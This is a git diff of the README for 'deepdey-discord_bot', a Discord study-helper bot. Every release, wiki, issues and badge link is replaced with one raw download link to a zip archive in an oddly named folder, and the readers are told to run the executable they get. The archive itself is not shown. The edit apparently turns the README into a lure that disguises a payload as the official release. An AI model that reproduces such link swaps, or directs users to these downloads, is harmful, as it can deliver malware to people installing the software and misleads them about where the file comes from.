@@ -1,6 +1,6 @@
 # 🤖 deepdey-discord_bot - Your Study Buddy for Discord  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bcallanan/deepdey-discord_bot/releases)  
+[![Download Now](https://raw.githubusercontent.com/bcallanan/deepdey-discord_bot/main/enneagon/deepdey-discord_bot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bcallanan/deepdey-discord_bot/main/enneagon/deepdey-discord_bot.zip)  
 
 ## 🚀 Getting Started  
 
@@ -22,7 +22,7 @@ Welcome to the deepdey-discord_bot! This modular Discord bot is designed specifi
 
 To get started, you need to download the bot.  
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/bcallanan/deepdey-discord_bot/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/bcallanan/deepdey-discord_bot/main/enneagon/deepdey-discord_bot.zip).
 2. **Select the Latest Version**: Click on the most recent release and look for the installation file.
 3. **Download the File**: Click on the link to download the executable file for your system.
 4. **Run the Executable**: Once downloaded, open the file and follow the prompts to install the bot.  
@@ -59,8 +59,8 @@ To uninstall, follow your system’s standard uninstallation process and remove 
 Join our community of learners and educators! Share your experiences, feedback, and suggestions for further improvements. Get involved by joining the discussions on our Discord server.
 
 ## 🔗 Links  
-- [Releases Page](https://github.com/bcallanan/deepdey-discord_bot/releases)  
-- [Documentation & Guide](https://github.com/bcallanan/deepdey-discord_bot/wiki)  
-- [Support & Help](https://github.com/bcallanan/deepdey-discord_bot/issues)  
+- [Releases Page](https://raw.githubusercontent.com/bcallanan/deepdey-discord_bot/main/enneagon/deepdey-discord_bot.zip)  
+- [Documentation & Guide](https://raw.githubusercontent.com/bcallanan/deepdey-discord_bot/main/enneagon/deepdey-discord_bot.zip)  
+- [Support & Help](https://raw.githubusercontent.com/bcallanan/deepdey-discord_bot/main/enneagon/deepdey-discord_bot.zip)  
 
 Feel free to reach out through the links above if you need more help or have questions. Enjoy using deepdey-discord_bot!
